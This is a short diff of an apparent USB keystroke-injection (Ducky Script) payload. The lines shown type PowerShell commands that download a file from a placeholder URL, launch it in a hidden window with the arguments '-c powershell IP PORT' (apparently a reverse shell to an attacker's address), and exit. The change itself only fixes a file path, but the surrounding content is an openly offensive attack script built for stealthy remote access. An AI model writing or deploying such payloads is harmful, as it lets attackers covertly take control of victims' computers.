@@ -27,7 +27,7 @@ STRING Invoke-WebRequest -Uri <FILE> -OutFile <FILE.dll>
 ENTER
 DELAY 2000
 REM execution and stealth
-STRING Start-Process C:\temp\s<FILE> -ArgumentList '-c powershell IP PORT' -WindowStyle hidden
+STRING Start-Process C:\temp\<FILE> -ArgumentList '-c powershell IP PORT' -WindowStyle hidden
 ENTER
 DELAY 750
 STRING exit
